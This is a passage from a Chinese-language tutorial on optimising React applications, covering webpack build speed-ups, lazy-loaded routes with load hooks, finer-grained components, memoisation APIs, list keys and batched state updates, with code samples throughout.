HappyPack({\n    id:'babel',\n    loaders:['babel-loader?cacheDirectory=true']\n})\n```\n\n#### ③缓存babel编译过的文件\n\n```js\nloaders:['babel-loader?cacheDirectory=true']\n```\n\n#### ④tree Shaking 删除冗余代码\n\n#### ⑤按需加载，按需引入。\n\n**优化后项目结构**\n\n![](https://static.ecool.fun//article/71aab226-92e6-4d58-b1bd-849203875977.awebp)\n\n**优化构建时间如下：**\n\n![](https://static.ecool.fun//article/903f5902-163e-4301-90ce-11fb6fc9781e.awebp)\n\n**一次 `compilation` 时间 从23秒优化到了4.89秒**\n\n**优化打包后的体积：**\n\n![](https://static.ecool.fun//article/9c91b902-d9c8-4585-a728-889202ed123d.awebp)\n\n由此可见，如果我们的`react`是自己徒手搭建的，一些优化技巧显得格外重要。\n\n### 关于类似antd UI库的瘦身思考\n\n我们在做`react`项目的时候，会用到`antd`之类的ui库，值得思考的一件事是，如果我们只是用到了`antd`中的个别组件，比如`<Button />` ,就要把整个样式库引进来，打包就会发现，体积因为引入了整个样式大了很多。我们可以通过`.babelrc`实现**按需引入**。\n\n**瘦身前**\n\n![](https://static.ecool.fun//article/eb827f5e-d3ee-4f2f-aa5a-0d8df58d1a55.awebp)\n\n`.babelrc` 增加对 `antd` 样式按需引入。\n\n```js\n[\"import\", {\n    \"libraryName\":\n    \"antd\",\n    \"libraryDirectory\": \"es\",\n    \"style\": true\n}]\n```\n\n**瘦身后**\n\n![](https://static.ecool.fun//article/0b167349-8576-4c71-b141-3ade44167f35.awebp)\n\n### 总结\n\n如果想要优化`react`项目，从构建开始是必不可少的。我们要重视从构建到打包上线的每一个环节。\n\n## 二 路由懒加载，路由监听器\n\n`react`路由懒加载，是笔者看完`dva`源码中的 `dynamic`异步加载组件总结出来的，针对大型项目有很多页面，在配置路由的时候，如果没有对路由进行处理，一次性会加载大量路由，这对页面初始化很不友好，会延长页面初始化时间，所以我们想这用`asyncRouter`来按需加载页面路由。\n\n### 传统路由\n\n如果我们没有用`umi`等框架，需要手动配置路由的时候，也许路由会这样配置。\n\n```js\n<Switch>\n    <Route path={'/index'} component={Index} ></Route>\n    <Route path={'/list'} component={List} ></Route>\n    <Route path={'/detail'} component={ Detail } ></Route>\n    <Redirect from='/*' to='/index' />\n</Switch>\n```\n\n或者用list保存路由信息，方便在进行路由拦截，或者配置路由菜单等。\n\n```js\nconst router = [\n    {\n        'path': '/index',\n        'component': Index\n    },\n    {\n        'path': '/list'',\n        'component': List\n    },\n    {\n        'path': '/detail',\n        'component': Detail\n    },\n]\n\n```\n\n### asyncRouter懒加载路由,并实现路由监听\n\n我们今天讲的这种`react`路由懒加载是基于`import` 函数路由懒加载， 众所周知 ，`import` 执行会返回一个`Promise`作为异步加载的手段。我们可以利用这点来实现`react`异步加载路由\n\n好的一言不合上代码。。。\n\n**代码**\n\n```js\nconst routerObserveQueue = [] /* 存放路由卫视钩子 */\n/* 懒加载路由卫士钩子 */\nexport const RouterHooks = {\n  /* 路由组件加载之前 */\n  beforeRouterComponentLoad: function(callback) {\n    routerObserveQueue.push({\n      type: 'before',\n      callback\n    })\n  },\n  /* 路由组件加载之后 */\n  afterRouterComponentDidLoaded(callback) {\n    routerObserveQueue.push({\n      type: 'after',\n      callback\n    })\n  }\n}\n/* 路由懒加载HOC */\nexport default function AsyncRouter(loadRouter) {\n  return class Content extends React.Component {\n    constructor(props) {\n      super(props)\n      /* 触发每个路由加载之前钩子函数 */\n      this.dispatchRouterQueue('before')\n    }\n    state = {Component: null}\n    dispatchRouterQueue(type) {\n      const {history} = this.props\n      routerObserveQueue.forEach(item => {\n        if (item.type === type) item.callback(history)\n      })\n    }\n    componentDidMount() {\n      if (this.state.Component) return\n      loadRouter()\n        .then(module => module.default)\n        .then(Component => this.setState({Component},\n          () => {\n            /* 触发每个路由加载之后钩子函数 */\n            this.dispatchRouterQueue('after')\n          }))\n    }\n    render() {\n      const {Component} = this.state\n      return Component ? <Component {\n      ...this.props\n      }\n      /> : null\n    }\n  }\n}\n\n```\n\n`asyncRouter`实际就是一个高级组件,将`()=>import()`作为加载函数传进来，然后当外部`Route`加载当前组件的时候，在`componentDidMount`生命周期函数，加载真实的组件，并渲染组件，我们还可以写针对路由懒加载状态定制属于自己的路由监听器`beforeRouterComponentLoad`和`afterRouterComponentDidLoaded`，类似`vue`中 `watch $route` 功能。接下来我们看看如何使用。\n\n**使用**\n\n```js\nimport AsyncRouter ,{ RouterHooks }  from './asyncRouter.js'\nconst { beforeRouterComponentLoad} = RouterHooks\nconst Index = AsyncRouter(()=>import('../src/page/home/index'))\nconst List = AsyncRouter(()=>import('../src/page/list'))\nconst Detail = AsyncRouter(()=>import('../src/page/detail'))\nconst index = () => {\n  useEffect(()=>{\n    /* 增加监听函数 */  \n    beforeRouterComponentLoad((history)=>{\n      console.log('当前激活的路由是',history.location.pathname)\n    })\n  },[])\n  return <div >\n    <div >\n      <Router  >\n      <Meuns/>\n      <Switch>\n          <Route path={'/index'} component={Index} ></Route>\n          <Route path={'/list'} component={List} ></Route>\n          <Route path={'/detail'} component={ Detail } ></Route>\n          <Redirect from='/*' to='/index' />\n       </Switch>\n      </Router>\n    </div>\n  </div>\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/8819963d-702d-485a-93d9-45a9b5cea2d2.awebp)\n\n这样一来，我们既做到了路由的懒加载，又弥补了`react-router`没有监听当前路由变化的监听函数的缺陷。\n\n## 三 受控性组件颗粒化 ，独立请求服务渲染单元\n\n可控性组件颗粒化，独立请求服务渲染单元是笔者在实际工作总结出来的经验。目的就是避免因自身的渲染更新或是副作用带来的全局重新渲染。\n\n### 1 颗粒化控制可控性组件\n\n可控性组件和非可控性的区别就是`dom`元素值是否与受到`react`数据状态`state`控制。一旦由`react的state`控制数据状态，比如`input`输入框的值，就会造成这样一个场景，为了使`input`值实时变化，会不断`setState`，就会不断触发`render`函数，如果父组件内容简单还好，如果父组件比较复杂，会造成牵一发动全身，如果其他的子组件中`componentWillReceiveProps`这种带有副作用的钩子，那么引发的蝴蝶效应不敢想象。比如如下`demo`。\n\n```js\nclass index extends React.Component<any,any>{\n    constructor(props){\n        super(props)\n        this.state={\n            inputValue:''\n        }\n    }\n    handerChange=(e)=> this.setState({ inputValue:e.target.value  })\n    render(){\n        const { inputValue } = this.state\n        return <div>\n            { /*  我们增加三个子组件 */ }\n            <ComA />\n            <ComB />\n            <ComC />\n            <div className=\"box\" >\n                <Input  value={inputValue}  onChange={ (e)=> this.handerChange(e) } />\n            </div>\n            {/* 我们首先来一个列表循环 */}\n            {\n                new Array(10).fill(0).map((item,index)=>{\n                    console.log('列表循环了' )\n                    return <div key={index} >{item}</div>\n                })\n            }\n            {\n              /* 这里可能是更复杂的结构 */\n              /* ------------------ */\n            }\n        </div>\n    }\n}\n```\n\n**组件A**\n\n```js\nfunction index(){\n    console.log('组件A渲染')\n   return <div>我是组件A</div>\n}\n\n```\n\n**组件B，有一个componentWillReceiveProps钩子**\n\n```js\nclass Index extends React.Component{\n    constructor(props){\n        super(props)\n    }\n    componentWillReceiveProps(){\n        console.log('componentWillReceiveProps执行')\n        /* 可能做一些骚操作 wu lian */\n    }\n    render(){\n        console.log('组件B渲染')\n        return <div>\n            我是组件B\n        </div>\n    }\n}\n```\n\n**组件C有一个列表循环**\n\n```js\nclass Index extends React.Component{\n    constructor(props){\n        super(props)\n    }\n\n    render(){\n        console.log('组件c渲染')\n        return <div>\n              我是组件c\n             {\n                new Array(10).fill(0).map((item,index)=>{\n                    console.log('组件C列表循环了' )\n                    return <div key={index} >{item}</div>\n                })\n            }\n        </div>\n    }\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/640ced94-18c4-4910-b009-70a9fc89a4d5.awebp)\n\n当我们在input输入内容的时候。就会造成如上的现象，所有的不该重新更新的地方，全部重新执行了一遍，这无疑是巨大的性能损耗。这个一个`setState`触发带来的一股巨大的由此组件到子组件可能更深的更新流，带来的副作用是不可估量的。所以我们可以思考一下，是否将这种受控性组件颗粒化，让自己更新 -> 渲染过程由自身调度。\n\n说干就干，我们对上面的input表单单独**颗粒化**处理。\n\n```js\nconst ComponentInput = memo(function({ notifyFatherChange }:any){\n    const [ inputValue , setInputValue ] = useState('')\n    const handerChange = useMemo(() => (e) => {\n        setInputValue(e.target.value)\n        notifyFatherChange && notifyFatherChange(e.target.value)\n    },[])\n    return <Input   value={inputValue} onChange={ handerChange  }  />\n})\n```\n\n此时的组件更新由组件单元自行控制，不需要父组件的更新，所以不需要父组件设置独立`state`保留状态。只需要绑定到`this`上即可。不是所有状态都应该放在组件的 state 中. 例如缓存数据。如果需要组件响应它的变动, 或者需要渲染到视图中的数据才应该放到 state 中。这样可以避免不必要的数据变动导致组件重新渲染.\n\n```js\nclass index extends React.Component<any,any>{   \n    formData :any = {}\n    render(){\n        return <div>\n            { /*  我们增加三个子组件 */ }\n            <ComA />\n            <ComB />\n            <ComC />\n            <div className=\"box\" >\n               <ComponentInput notifyFatherChange={ (value)=>{ this.formData.inputValue = value } }  />\n               <Button onClick={()=> console.log(this.formData)} >打印数据</Button>\n            </div>\n            {/* 我们首先来一个列表循环 */}\n            {\n                new Array(10).fill(0).map((item,index)=>{\n                    console.log('列表循环了' )\n                    return <div key={index} >{item}</div>\n                })\n            }\n            {\n              /* 这里可能是更复杂的结构 */\n              /* ------------------ */\n            }\n        </div>\n    }\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/d676557b-0c13-4743-952f-2d4275529204.awebp)\n\n这样除了当前组件外，其他地方没有收到任何渲染波动，达到了我们想要的目的。\n\n### 2 建立独立的请求渲染单元\n\n建立独立的请求渲染单元，直接理解就是，如果我们把页面，分为请求数据展示部分(通过调用后端接口，获取数据)，和基础部分(不需要请求数据，已经直接写好的)，对于一些逻辑交互不是很复杂的数据展示部分，我推荐用一种独立组件，独立请求数据，独立控制渲染的模式。至于为什么我们可以慢慢分析。\n\n首先我们看一下传统的页面模式。\n\n![](https://static.ecool.fun//article/1eac1cf6-dadb-493e-a72c-1acd31e82f8f.awebp)\n\n页面有三个展示区域分别，做了三次请求，触发了三次`setState`,渲染三次页面，即使用`Promise.all`等方法，但是也不保证接下来交互中，会有部分展示区重新拉取数据的可能。一旦有一个区域重新拉取数据，另外两个区域也会说、受到牵连，这种效应是不可避免的，即便react有很好的d`diff`算法去调协相同的节点，但是比如长列表等情况，循环在所难免。\n\n```js\nclass Index extends React.Component{\n    state :any={\n        dataA:null,\n        dataB:null,\n        dataC:null\n    }\n    async componentDidMount(){\n        /* 获取A区域数据 */\n        const dataA = await getDataA()\n        this.setState({ dataA })\n        /* 获取B区域数据 */\n        const dataB = await getDataB()\n        this.setState({ dataB })\n        /* 获取C区域数据 */\n        const dataC = await getDataC()\n        this.setState({ dataC })\n    }\n    render(){\n        const { dataA , dataB , dataC } = this.state\n        console.log(dataA,dataB,dataC)\n        return <div>\n            <div> { /* 用 dataA 数据做展示渲染 */ } </div>\n            <div> { /* 用 dataB 数据做展示渲染 */ } </div>\n            <div> { /* 用 dataC 数据做展示渲染 */ } </div>\n        </div>\n    }\n}\n```\n\n接下来我们，把每一部分抽取出来，形成独立的渲染单元，每个组件都独立数据请求到独立渲染。\n\n```js\nfunction ComponentA(){\n    const [ dataA, setDataA ] = useState(null)\n    useEffect(()=>{\n       getDataA().then(res=> setDataA(res.data)  )\n    },[])\n    return  <div> { /* 用 dataA 数据做展示渲染 */ } </div>\n} \n\nfunction ComponentB(){\n    const [ dataB, setDataB ] = useState(null)\n    useEffect(()=>{\n       getDataB().then(res=> setDataB(res.data)  )\n    },[])\n    return  <div> { /* 用 dataB 数据做展示渲染 */ } </div>\n} \n\nfunction ComponentC(){\n    const [ dataC, setDataC ] = useState(null)\n    useEffect(()=>{\n       getDataC().then(res=> setDataC(res.data)  )\n    },[])\n    return  <div> { /* 用 dataC 数据做展示渲染 */ } </div>\n}  \n\nfunction Index (){\n    return <div>\n        <ComponentA />\n        <ComponentB />\n        <ComponentC />\n    </div>\n}\n```\n\n这样一来，彼此的数据更新都不会相互影响。\n\n![](https://static.ecool.fun//article/f0721c47-5563-4110-b2e5-8c0bf608d62f.awebp)\n\n#### 总结\n\n拆分需要单独调用后端接口的细小组件，建立独立的数据请求和渲染，这种依赖数据更新 -> 视图渲染的组件，能从整个体系中抽离出来 ，好处我总结有以下几个方面。\n\n1 可以避免父组件的冗余渲染 ，`react`的数据驱动，依赖于 `state` 和 `props` 的改变，改变`state` 必然会对组件 `render` 函数调用，如果父组件中的子组件过于复杂，一个自组件的 `state` 改变，就会牵一发动全身，必然影响性能，所以如果把很多依赖请求的组件抽离出来，可以直接减少渲染次数。\n\n2 可以优化组件自身性能，无论从`class`声明的有状态组件还是`fun`声明的无状态，都有一套自身优化机制，无论是用`shouldupdate` 还是用 `hooks`中 `useMemo` `useCallback` ，都可以根据自身情况，定制符合场景的渲条 件，使得依赖数据请求组件形成自己一个小的，适合自身的渲染环境。\n\n3 能够和`redux` ,以及`redux`衍生出来 `redux-action` , `dva`,更加契合的工作，用 `connect` 包裹的组件，就能通过制定好的契约，根据所需求的数据更新，而更新自身，而把这种模式用在这种小的，需要数据驱动的组件上，就会起到物尽其用的效果。\n\n## 四 shouldComponentUpdate ,PureComponent 和 React.memo ,immetable.js 助力性能调优\n\n在这里我们拿`immetable.js`为例，讲最传统的限制更新方法，第六部分将要将一些避免重新渲染的细节。\n\n### 1 PureComponent 和 React.memo\n\n`React.PureComponent` 与 `React.Component` 用法差不多 ,但 `React.PureComponent` 通过props和state的浅对比来实现 `shouldComponentUpate()`。如果对象包含复杂的数据结构(比如对象和数组)，他会浅比较，如果深层次的改变，是无法作出判断的，`React.PureComponent` 认为没有变化，而没有渲染试图。\n\n如这个例子\n\n```js\nclass Text extends React.PureComponent<any,any>{\n    render(){\n        console.log(this.props)\n        return <div>hello,wrold</div>\n    }\n}\nclass Index extends React.Component<any,any>{\n    state={\n        data:{ a : 1 , b : 2 }\n    }\n    handerClick=()=>{\n        const { data } = this.state\n        data.a++\n        this.setState({ data })\n    }\n    render(){\n        const { data } = this.state\n        return <div>\n            <button onClick={ this.handerClick } >点击</button>\n            <Text data={data} />\n        </div>\n    }\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/6312cb04-de5c-4070-9d68-2eb5aaf237a6.awebp)\n\n我们点击按钮，发现 `<Text />` 根本没有重新更新。这里虽然改了`data`但是只是改变了`data`下的属性，所以 `PureComponent` 进行浅比较不会`update`。\n\n想要解决这个问题实际也很容易。\n\n```js\n <Text data={{ ...data }} />\n```\n\n无论组件是否是 `PureComponent`，如果定义了 `shouldComponentUpdate()`，那么会调用它并以它的执行结果来判断是否 `update`。在组件未定义 `shouldComponentUpdate()` 的情况下，会判断该组件是否是 `PureComponent`，如果是的话，会对新旧 `props、state` 进行 `shallowEqual` 比较，一旦新旧不一致，会触发渲染更新。\n\n`react.memo` 和 `PureComponent` 功能类似 ，`react.memo` 作为第一个高阶组件，第二个参数 可以对`props` 进行比较 ，和`shouldComponentUpdate`不同的, 当第二个参数返回 `true` 的时候，证明`props`没有改变，不渲染组件，反之渲染组件。\n\n### 2 shouldComponentUpdate\n\n使用 `shouldComponentUpdate()` 以让`React`知道当`state或props`的改变是否影响组件的重新`render`，默认返回`ture`，返回`false`时不会重新渲染更新，而且该方法并不会在初始化渲染或当使用 `forceUpdate()` 时被调用，通常一个`shouldComponentUpdate` 应用是这么写的。\n\n**控制状态**\n\n```js\nshouldComponentUpdate(nextProps, nextState) {\n  /* 当 state 中 data1 发生改变的时候，重新更新组件 */  \n  return nextState.data1 !== this.state.data1\n}\n```\n\n这个的意思就是 仅当`state` 中 `data1` 发生改变的时候，重新更新组件。 **控制prop属性**\n\n```js\nshouldComponentUpdate(nextProps, nextState) {\n  /* 当 props 中 data2发生改变的时候，重新更新组件 */  \n  return nextProps.data2 !== this.props.data2\n}\n```\n\n这个的意思就是 仅当`props` 中 `data2` 发生改变的时候，重新更新组件。\n\n### 3 immetable.js\n\n`immetable.js` 是Facebook 开发的一个`js`库，可以提高对象的比较性能，像之前所说的`pureComponent` 只能对对象进行浅比较，,对于对象的数据类型,却束手无策,所以我们可以用 `immetable.js` 配合 `shouldComponentUpdate` 或者 `react.memo`来使用。`immutable` 中\n\n我们用`react-redux`来简单举一个例子，如下所示 数据都已经被 `immetable.js`处理。\n\n```js\nimport { is  } from 'immutable'\nconst GoodItems = connect(state =>\n    ({ GoodItems: filter(state.getIn(['Items', 'payload', 'list']), state.getIn(['customItems', 'payload', 'list'])) || Immutable.List(), })\n    /* 此处省略很多代码～～～～～～ */\n)(memo(({ Items, dispatch, setSeivceId }) => {\n   /*  */\n}, (pre, next) => is(pre.Items, next.Items)))\n\n```\n\n通过 `is` 方法来判断，前后`Items`(对象数据类型)是否发生变化。\n\n## 五 规范写法，合理处理细节问题\n\n有的时候，我们在敲代码的时候，稍微注意以下，就能避免性能的开销。也许只是稍加改动，就能其他优化性能的效果。\n\n### ①绑定事件尽量不要使用箭头函数\n\n#### 面临问题\n\n众所周知，`react`更新来大部分情况自于`props`的改变(被动渲染)，和`state`改变(主动渲染)。当我们给未加任何更新限定条件子组件绑定事件的时候，或者是`PureComponent` 纯组件， 如果我们箭头函数使用的话。\n\n```js\n<ChildComponent handerClick={()=>{ console.log(666) }}  />\n```\n\n每次渲染时都会创建一个新的事件处理器，这会导致 `ChildComponent` 每次都会被渲染。\n\n即便我们用箭头函数绑定给`dom`元素。\n\n```jsx\n<div onClick={ ()=>{ console.log(777) } } >hello,world</div>\n```\n\n每次`react`合成事件事件的时候，也都会重新声明一个新事件。\n\n#### 解决问题\n\n解决这个问题事件很简单，分为无状态组件和有状态组件。\n\n**有状态组件**\n\n```js\nclass index extends React.Component{\n    handerClick=()=>{\n        console.log(666)\n    }\n    handerClick1=()=>{\n        console.log(777)\n    }\n    render(){\n        return <div>\n            <ChildComponent handerClick={ this.handerClick }  />\n            <div onClick={ this.handerClick1 }  >hello,world</div>\n        </div>\n    }\n}\n```\n\n**无状态组件**\n\n```js\nfunction index(){\n   \n    const handerClick1 = useMemo(()=>()=>{\n       console.log(777)\n    },[])  /* [] 存在当前 handerClick1 的依赖项*/\n    const handerClick = useCallback(()=>{ console.log(666) },[])  /* [] 存在当前 handerClick 的依赖项*/\n    return <div>\n        <ChildComponent handerClick={ handerClick }  />\n        <div onClick={ handerClick1 }  >hello,world</div>\n    </div>\n}\n```\n\n对于`dom`，如果我们需要传递参数。我们可以这么写。\n\n```js\nfunction index(){\n    const handerClick1 = useMemo(()=>(event)=>{\n        const mes = event.currentTarget.dataset.mes\n        console.log(mes) /* hello,world */\n    },[])\n    return <div>\n        <div  data-mes={ 'hello,world' } onClick={ handerClick1 }  >hello,world</div>\n    </div>\n}\n```\n\n### ②循环正确使用key\n\n无论是`react` 和 `vue`,正确使用`key`,目的就是在一次循环中，找到与新节点对应的老节点，复用节点，节省开销。想深入理解的同学可以看一下笔者的另外一篇文章 [全面解析 vue3.0 diff算法](https://juejin.cn/post/6861960532048642061 \"https://juejin.cn/post/6861960532048642061\") 里面有对`key`详细说明。我们今天来看以下`key`正确用法,和错误用法。\n\n#### 1 错误用法\n\n**错误用法一：用index做key**\n\n```js\nfunction index(){\n    const list = [ { id:1 , name:'哈哈' } , { id:2, name:'嘿嘿' } ,{ id:3 , name:'嘻嘻' } ]\n    return <div>\n       <ul>\n         {  list.map((item,index)=><li key={index} >{ item.name }</li>)  }\n       </ul>\n    </div>\n}\n```\n\n这种加`key`的性能,实际和不加`key`效果差不多，每次还是从头到尾diff。\n\n**错误用法二:用index拼接其他的字段**\n\n```js\nfunction index(){\n    const list = [ { id:1 , name:'哈哈' } , { id:2, name:'嘿嘿' } ,{ id:3 , name:'嘻嘻' } ]\n    return <div>\n       <ul>\n         {  list.map((item,index)=><li key={index + item.name } >{ item.name }</li>)  }\n       </ul>\n    </div>\n}\n```\n\n如果有元素移动或者删除，那么就失去了一一对应关系，剩下的节点都不能有效复用。\n\n#### 2 正确用法\n\n**正确用法：用唯一id作为key**\n\n```js\nfunction index(){\n    const list = [ { id:1 , name:'哈哈' } , { id:2, name:'嘿嘿' } ,{ id:3 , name:'嘻嘻' } ]\n    return <div>\n       <ul>\n         {  list.map((item,index)=><li key={ item.id } >{ item.name }</li>)  }\n       </ul>\n    </div>\n}\n```\n\n用唯一的健`id`作为`key`,能够做到有效复用元素节点。\n\n### ③无状态组件`hooks-useMemo` 避免重复声明。\n\n对于无状态组件，数据更新就等于函数上下文的重复执行。那么函数里面的变量，方法就会重新声明。比如如下情况。\n\n```js\nfunction Index(){\n    const [ number , setNumber  ] = useState(0)\n    const handerClick1 = ()=>{\n        /* 一些操作 */\n    }\n    const handerClick2 = ()=>{\n        /* 一些操作 */\n    }\n    const handerClick3 = ()=>{\n        /* 一些操作 */\n    }\n    return <div>\n        <a onClick={ handerClick1 } >点我有惊喜1</a>\n        <a onClick={ handerClick2 } >点我有惊喜2</a>\n        <a onClick={ handerClick3 } >点我有惊喜3</a>\n        <button onClick={ ()=> setNumber(number+1) } > 点击 { number } </button>\n    </div>\n}\n```\n\n每次点击`button`的时候,都会执行`Index`函数。`handerClick1` , `handerClick2`,`handerClick3`都会重新声明。为了避免这个情况的发生，我们可以用 `useMemo` 做缓存，我们可以改成如下。\n\n```js\nfunction Index(){\n    const [ number , setNumber  ] = useState(0)\n    const [ handerClick1 , handerClick2  ,handerClick3] = useMemo(()=>{\n        const fn1 = ()=>{\n            /* 一些操作 */\n        }\n        const fn2 = ()=>{\n            /* 一些操作 */\n        }\n        const  fn3= ()=>{\n            /* 一些操作 */\n        }\n        return [fn1 , fn2 ,fn3]\n    },[]) /* 只有当数据里面的依赖项，发生改变的时候，才会重新声明函数。 */\n    return <div>\n        <a onClick={ handerClick1 } >点我有惊喜1</a>\n        <a onClick={ handerClick2 } >点我有惊喜2</a>\n        <a onClick={ handerClick3 } >点我有惊喜3</a>\n        <button onClick={ ()=> setNumber(number+1) } > 点击 { number } </button>\n    </div>\n}\n```\n\n如下改变之后，`handerClick1` , `handerClick2`,`handerClick3` 会被缓存下来。\n\n### ④懒加载 Suspense 和 lazy\n\n`Suspense` 和 `lazy` 可以实现 `dynamic import` 懒加载效果，原理和上述的路由懒加载差不多。在 `React` 中的使用方法是在 `Suspense` 组件中使用 `<LazyComponent>` 组件。\n\n```js\nconst LazyComponent = React.lazy(() => import('./LazyComponent'));\n\nfunction demo () {\n  return (\n    <div>\n      <Suspense fallback={<div>Loading...</div>}>\n        <LazyComponent />\n      </Suspense>\n    </div>\n  )\n}\n```\n\n`LazyComponent` 是通过懒加载加载进来的，所以渲染页面的时候可能会有延迟，但使用了 `Suspense` 之后，在加载状态下，可以用`<div>Loading...</div>`作为`loading`效果。\n\n`Suspense` 可以包裹多个懒加载组件。\n\n```js\n<Suspense fallback={<div>Loading...</div>}>\n    <LazyComponent />\n    <LazyComponent1 />\n</Suspense>\n\n```\n\n## 六 多种方式避免重复渲染\n\n**避免重复渲染**,是`react`性能优化的重要方向。如果想尽心尽力处理好`react`项目每一个细节，那么就要从每一行代码开始，从每一组件开始。正所谓不积硅步无以至千里。\n\n### ① 学会使用的批量更新\n\n#### 批量更新\n\n这次讲的批量更新的概念，实际主要是针对无状态组件和`hooks`中`useState`,和 `class`有状态组件中的`this.setState`，两种方法已经做了批量更新的处理。比如如下例子\n\n**一次更新中**\n\n```js\nclass index extends React.Component{\n    constructor(prop){\n        super(prop)\n        this.state = {\n            a:1,\n            b:2,\n            c:3,\n        }\n    }\n    handerClick=()=>{\n        const { a,b,c } :any = this.state\n        this.setState({ a:a+1 })\n        this.setState({ b:b+1 })\n        this.setState({ c:c+1 })\n    }\n    render= () => <div onClick={this.handerClick} />\n}\n```\n\n点击事件发生之后，会触发三次 `setState`,但是不会渲染三次，因为有一个批量更新`batchUpdate`批量更新的概念。三次`setState`最后被合成类似如下样子\n\n```js\nthis.setState({\n    a:a+1 ,\n    b:b+1 ,\n    c:c+1 \n})\n```\n\n**无状态组件中**\n\n```js\n    const  [ a , setA ] = useState(1)\n    const  [ b , setB ] = useState({})\n    const  [ c , setC ] = useState(1)\n    const handerClick = () => {\n        setB( { ...b } ) \n        setC( c+1 ) \n        setA( a+1 )\n    }\n```\n\n#### 批量更新失效\n\n当我们针对上述两种情况加以如下处理之后。\n\n```js\nhanderClick=()=>{\n    setTimeout(() => {\n        this.setState({ a:a+1 })\n        this.setState({ b:b+1 })\n        this.setState({ c:c+1 })\n    }, 0)\n}\n```\n\n```js\n const handerClick = () => {\n    Promise.resolve().then(()=>{\n    setB( { ...b } ) \n    setC( c+1 ) \n    setA( a+1 )\n    })\n}\n```\n\n我们会发现，上述两种情况 ，组件都更新渲染了三次 ，此时的批量更新失效了。这种情况在`react-hooks`中也普遍存在，这种情况甚至在`hooks`中更加明显，因为我们都知道`hooks`中每个`useState`保存了一个状态，并不是让`class`声明组件中，可以通过`this.state`统一协调状态，再一次异步函数中，比如说一次`ajax`请求后，想通过多个`useState`改变状态，会造成多次渲染页面，为了解决这个问题，我们可以手动批量更新。\n\n#### 手动批量更新\n\n`react-dom` 中提供了`unstable_batchedUpdates`方法进行手动批量更新。这个`api`更契合`react-hooks`，我们可以这样做。\n\n```js\n const handerClick = () => {\n    Promise.resolve().then(()=>{\n        unstable_batchedUpdates(()=>{\n            setB( { ...b } ) \n            setC( c+1 ) \n            setA( a+1 )\n        })\n    })\n}\n```\n\n这样三次更新，就会合并成一次。同样达到了批量更新的效果。\n\n### ② 合并state\n\n#### class类组件(有状态组件)\n\n合并`state`这种，是一种我们在`react`项目开发中要养成的习惯。我看过有些同学的代码中可能会这么写(如下`demo`是模拟的情况，实际要比这复杂的多)。\n\n```js\nclass Index extends React.Component<any , any>{\n    state = {\n          loading:false /* 用来模拟loading效果 */,\n          list:[],\n    }\n    componentDidMount(){\n        /* 模拟一个异步请求数据场景 */\n        this.setState({ loading : true }) /* 开启loading效果 */\n        Promise.resolve().then(()=>{\n            const list = [ { id:1 , name: 'xixi' } ,{ id:2 , name: 'haha' },{ id:3 , name: 'heihei' } ]\n            this.setState({ loading : false },()=>{\n                this.setState({\n                    list:list.map(item=>({\n                        ...item,\n                        name:item.name.toLocaleUpperCase()\n                    }))\n                })\n            })\n        })\n    }\n    render(){\n    const { list } = this.state\n    return <div>{\n            list.map(item=><div key={item.id}  >{ item.name }</div>)\n        }</div>\n    }\n}\n```\n\n分别用两次`this.state`第一次解除`loading`状态，第二次格式化数据列表。这另两次更新完全没有必要，可以用一次`setState`更新完美解决。不这样做的原因是，对于像`demo`这样的简单结构还好，对于复杂的结构，一次更新可能都是宝贵的，所以我们应该学会去合并state。将上述demo这样修改。\n\n```js\nthis.setState({\n    loading : false,\n    list:list.map(item=>({\n        ...item,\n        name:item.name.toLocaleUpperCase()\n    }))\n})\n```\n\n#### 函数组件(无状态组件)\n\n对于无状态组件，我们可以通过一个`useState`保存多个状态，没有必要每一个状态都用一个`useState`。\n\n对于这样的情况。\n\n```js\nconst [ a ,setA ] = useState(1)\nconst [ b ,setB ] = useState(2)\n```\n\n我们完全可以一个`state`搞定。\n\n```js\nconst [ numberState , setNumberState ] = useState({ a:1 , b :2})\n```\n\n但是要注意，如果我们的state已经成为 `useEffect` , `useCallback` , `useMemo`依赖项，请慎用如上方法。\n\n### ③ useMemo React.memo隔离单元\n\n`react`正常的更新流，就像利剑一下，从父组件项子组件穿透，为了避免这些重复的更新渲染，`shouldComponentUpdate` , `React.memo`等`api`也应运而生。但是有的情况下，多余的更新在所难免，比如如下这种情况。这种更新会由父组件 -> 子组件 传递下去。\n\n![](https://static.ecool.fun//article/c0689088-b74c-47c2-a531-d562a0eb955c.awebp)\n\n```js\nfunction ChildrenComponent(){\n    console.log(2222)\n    return <div>hello,world</div>\n}\nfunction Index (){\n    const [ list  ] = useState([ { id:1 , name: 'xixi' } ,{ id:2 , name: 'haha' },{ id:3 , name: 'heihei' } ])\n    const [ number , setNumber ] = useState(0)\n    return <div>\n       <span>{ number }</span>\n       <button onClick={ ()=> setNumber(number + 1) } >点击</button>\n           <ul>\n               {\n                list.map(item=>{\n                    console.log(1111)\n                    return <li key={ item.id }  >{ item.name }</li>\n                })\n               }\n           </ul>\n           <ChildrenComponent />\n    </div>\n}\n```\n\n**效果**\n\n![](https://static.ecool.fun//article/467ae1b3-7ba6-4a5a-b29a-f34ddeee2804.awebp)\n\n针对这一现象，我们可以通过使用`useMemo`进行隔离，形成独立的渲染单元，每次更新上一个状态会被缓存，循环不会再执行，子组件也不会再次被渲染,我们可以这么做。\n\n```js\nfunction Index (){\n    const [ list  ] = useState([ { id:1 , name: 'xixi' } ,{ id:2 , name: 'haha' },{ id:3 , name: 'heihei' } ])\n    const [ number , setNumber ] = useState(0)\n    return <div>\n       <span>{ number }</span>\n       <button onClick={ ()=> setNumber(number + 1) } >点击</button>\n           <ul>\n               {\n                useMemo(()=>(list.map(item=>{\n                    console.log(1111)\n                    return <li key={ item.id }  >{ item.name }</li>\n                })),[ list ])\n               }\n           </ul>\n        { useMemo(()=> <ChildrenComponent />,[]) }\n    </div>\n}\n```\n\n**有状态组件**\n\n在`class`声明的组件中，没有像 `useMemo` 的`API` ，但是也并不等于束手无策，我们可以通过 `react.memo` 来阻拦来自组件本身的更新。我们可以写一个组件，来控制`react` 组件更新的方向。我们通过一个 `<NotUpdate>` 组件来阻断更新流。\n\n```js\n/* 控制更新 ,第二个参数可以作为组件更新的依赖 ， 这里设置为 ()=> true 只渲染一次 */\nconst NotUpdate = React.memo(({ children }:any)=> typeof children === 'function' ? children() : children ,()=>true)\n\nclass Index extends React.Component<any,any>{\n    constructor(prop){\n        super(prop)\n        this.state = { \n            list: [ { id:1 , name: 'xixi' 